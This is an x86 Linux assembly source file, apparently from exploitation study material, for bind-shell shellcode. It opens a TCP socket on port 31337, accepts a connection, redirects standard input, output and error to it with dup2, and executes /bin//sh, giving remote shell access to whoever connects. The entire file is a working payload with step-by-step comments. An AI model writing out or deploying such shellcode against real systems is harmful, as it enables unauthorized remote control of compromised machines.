BITS 32
; s = socket(2, 1, 0)
push BYTE 0x66	; socketcall is syscall #102 (0x66)
pop eax
cdq		; zero out edx for use as a null DWORD later
xor ebx, ebx	; ebx is the type of socketcall
inc ebx		; 1 = SYS_SOCKET =socket()
push edx	; Build arg array: { protocol = 0,
push BYTE 0x1	; 	(in reverse) SOCK_STREAM = 1,
push BYTE 0x2	;			AF_INET = 2,
mov ecx, esp	; ecx = ptr to argument array
int 0x80	; after syscall, eax has socket fd

mov esi, eax	; save socket fd in esi for later uses

; bind(s , [2, 31337, 0], 16)
push BYTE 0x66	; socketcall (syscal #102)
pop eax
inc ebx		; ebx = 2 = SYS_BIND = bind()
push edx	; Build sockaddr struct: INADDR_ANAY =0
push WORD 0x697a ;	(in reverse order) PORT = 31337
push WORD bx	;				AF_INET = 2
mov ecx, esp	; ecx = server struct pointer
push BYTE 16	; argv: { sizeof(server struct) = 16,
push ecx	; 		server struct pointer,
push esi	;		socket fd }	
mov ecx, esp	; ecx = argument array
int 0x80	; eax = 0 on sucess

; listen( s, 0)
mov BYTE al, 0x66	; socketcall (syscall #102)
inc ebx
inc ebx		; ebx = 4 = SYS_LISTEN = listen()
push ebx	; argv: { backlog = 4,
push esi	;	  socket fd }
mov ecx, esp	; ecx = argument array
int 0x80

; c = accept( s, 0, 0)
mov BYTE al, 0x66	; socketcall (syscall #102)
inc ebx		; ebx = 5 = SYS_ACCEPT = accept(0
push edx	; argv: { socklen = 0,
push edx	;	  sockaddr ptr = NULL,
push esi	;	  socket fd }
mov ecx, esp	;	ecx = argument array
int 0x80	;	eax = connected socket fd


; dup2( connected socket, { all three standard I/O fds})
xchg eax, ebx	; put socket fd in ebx and 0x00000005 in eax
push BYTE 0x2	
pop ecx		; ecx starts at 2

dup_loop:
	mov BYTE al, 0x3f ; dup2 syscall #63
	int 0x80	; dup2( c, 0)
	dec ecx		; count down to 0
	jns dup_loop	; if the sign flag it not set, ecx it not negative

;mov ebx, eax	; move socket fd in ebx
;push BYTE 0x3f	; dup2, syscall #63
;pop eax
;xor ecx, ecx	; ecx = 0 = standard input
;int 0x80	; dup(c, 0)
;
;mov BYTE al, 0x3f	; dup2 syscall #63
;inc ecx		;ecx =1 = standard output
;int 0x80	; dup(c , 1)
;mov BYTE al, 0x3f	; dup2 syscall #63
;inc ecx		; ecx = 2 = standard error
;int 0x80	; dup(c, 2)

; execve( const char *filename, char *const argv[], char *const envp[])
mov BYTE al, 11	; execve syscall #11
push edx	; push some nulls for strings termination
push 0x68732f2f	; push "//sh" to the stack
push 0x6e69622f	; push "/bin" to the stack
mov ebx, esp	; put the addr of "/bin//sh" into ebx, via esp
push edx	; push 32-bit null terminator to stack
mov edx, esp	; this is an empty array for envp
push ebx	; push string addr to stack above null terminator
mov ecx, esp	; this is the argv array with string ptr
int 0x80	; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
